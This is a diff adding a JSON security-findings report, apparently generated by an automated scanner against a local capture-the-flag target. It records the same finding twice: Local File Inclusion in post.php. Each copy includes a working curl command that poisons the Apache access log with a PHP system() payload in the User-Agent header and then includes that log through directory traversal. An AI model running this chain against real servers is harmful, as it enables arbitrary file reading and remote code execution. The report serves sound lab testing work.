@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T00:50:36.776572+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "fadc7cb7-89c5-409d-a850-2ea2797332d1",
+      "timestamp": "2026-04-15T00:50:36.776454+00:00",
+      "title": "Local File Inclusion (LFI) leading to Flag Disclosure",
+      "severity": "critical",
+      "target": "http://172.17.0.1:56569",
+      "description": "The post.php endpoint is vulnerable to Local File Inclusion (LFI) via the 'id' parameter. An attacker can traverse the filesystem using directory traversal sequences (../../../../../) to read arbitrary files such as /etc/passwd and Apache access logs. The flag was discovered by injecting PHP code into the User-Agent header and then including the Apache access log to execute the injected code.",
+      "evidence": "flag{6f592559-dcf0-436c-ad0f-f0447b0444d9}",
+      "tool_used": "curl/lfi",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -A \"<?php system('cat /FLAG.php'); ?>\" http://172.17.0.1:56569/ && curl -s \"http://172.17.0.1:56569/post.php?id=../../../../../var/log/apache2/access.log\"",
+        "expected": "Flag output from executed PHP code"
+      }
+    },
+    {
+      "id": "8ef56c5f-2340-42d8-972a-d96cf12b2b56",
+      "timestamp": "2026-04-15T00:50:36.862675+00:00",
+      "title": "Local File Inclusion (LFI) leading to Flag Disclosure",
+      "severity": "critical",
+      "target": "http://172.17.0.1:56569",
+      "description": "The post.php endpoint is vulnerable to Local File Inclusion (LFI) via the 'id' parameter. An attacker can traverse the filesystem using directory traversal sequences (../../../../../) to read arbitrary files such as /etc/passwd and Apache access logs. The flag was discovered by injecting PHP code into the User-Agent header and then including the Apache access log to execute the injected code.",
+      "evidence": "flag{6f592559-dcf0-436c-ad0f-f0447b0444d9}",
+      "tool_used": "curl/lfi",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -A \"<?php system('cat /FLAG.php'); ?>\" http://172.17.0.1:56569/ && curl -s \"http://172.17.0.1:56569/post.php?id=../../../../../var/log/apache2/access.log\"",
+        "expected": "Flag output from executed PHP code"
+      }
+    }
+  ],
+  "diagrams": []
+}
